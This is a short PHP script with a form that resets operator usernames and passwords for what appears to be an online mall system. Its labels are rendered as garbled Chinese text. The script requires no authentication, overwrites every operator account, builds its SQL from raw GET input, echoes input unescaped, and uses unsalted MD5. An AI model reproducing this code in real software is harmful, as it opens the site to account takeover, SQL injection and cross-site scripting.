<?php
if(isset($_GET['password'])) {
	require("include/mall_config.php");
	$link=mysql_connect($dbHost,$dbUser,$dbPass); 
	mysql_select_db($dbName);
	$username=trim($_GET['username']);
	$password=md5(trim($_GET['password']));
	$query="update ".$_tbpre."mall_offer_operater set username='".$username."', userpass='".$password."'" ;
	if($rs=mysql_query($query,$link)){
			print "<br>�ѽ� <font color=red>$username</font> �������Ϊ <font color=red>".$_GET[password]."</font>";				
		}
		else{
			print mysql_error();
		}

	mysql_close($link);
}
?>
<form >
�û�����<input type="text" name="username"><br/>
�����룺<input type="text" name="password"><br/>
<input type="submit" name="submit")>
</form>